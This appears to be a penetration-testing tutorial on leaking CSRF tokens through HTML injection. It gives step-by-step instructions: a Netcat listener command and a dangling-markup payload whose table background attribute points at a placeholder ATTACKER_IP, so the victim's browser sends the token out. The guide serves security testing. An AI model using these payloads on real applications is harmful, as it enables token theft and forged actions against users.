# Cross-Site Request Forgery (POST-based)

Cross-Site Request Forgery (CSRF) tokens are essential for protecting web applications from unauthorized actions. However, if an application is vulnerable to HTML injection or XSS, attackers can exploit these vulnerabilities to leak CSRF tokens. Understanding how to identify and exploit these weaknesses is crucial for penetration testers.

***

#### 🔍 Understanding CSRF Token Leakage

CSRF tokens are typically included in POST requests to validate that the request is legitimate. If an attacker can inject HTML into a page, they may be able to extract the CSRF token and use it for malicious purposes.

**Key Characteristics of CSRF Token Leakage:**

* **HTML Injection Vulnerabilities**: If an application allows HTML injection, it can be exploited to leak sensitive information.
* **Remote Exploitation**: This type of attack does not require the attacker to be on the same local network as the victim.

***

#### 🧪 Testing for CSRF Token Leakage

To test for CSRF token leakage through HTML injection, follow these steps:

1. **Log into the Target Application**: Use valid credentials to access the application.
2.  **Identify HTML Injection Point**: Navigate to a feature that reflects user input, such as the account deletion confirmation page. Attempt to inject HTML into the input field. For example:

    ```html
    <h1>h1<u>underline<%2fu><%2fh1>
    ```
3. **Inspect the Source**: Check the page source to confirm that your HTML injection was successful. You should see your injected HTML reflected in the source code.
4.  **Set Up a Listener**: Use Netcat to listen for incoming connections on a specified port:

    ```bash
    nc -nlvp 8000
    ```
5.  **Craft the Payload**: Create a payload that will send the CSRF token to your listening machine. For example:

    ```html
    <table%20background='%2f%2f<ATTACKER_IP>:PORT%2f
    ```
6.  **Trigger the Payload**: While logged in as the victim, navigate to the URL that includes your crafted payload. For example:

    {% code overflow="wrap" %}
    ```html
    http://csrf.example.com/app/delete/%3Ctable background='%2f%2f<ATTACKER_IP>:PORT%2f
    ```
    {% endcode %}

    This will cause the victim's browser to make a request to your Netcat listener, leaking the CSRF token.

***

#### 📜 Example of CSRF Token Leakage

1. **Login to the Target Application**: Use valid credentials to log in.
2. **Inject HTML**: Input HTML into the email field on the delete account confirmation page.
3. **Set Up Netcat**: Start listening for incoming connections.
4. **Trigger the Attack**: Open the crafted URL while logged in. You should see the CSRF token appear in your Netcat terminal.

\
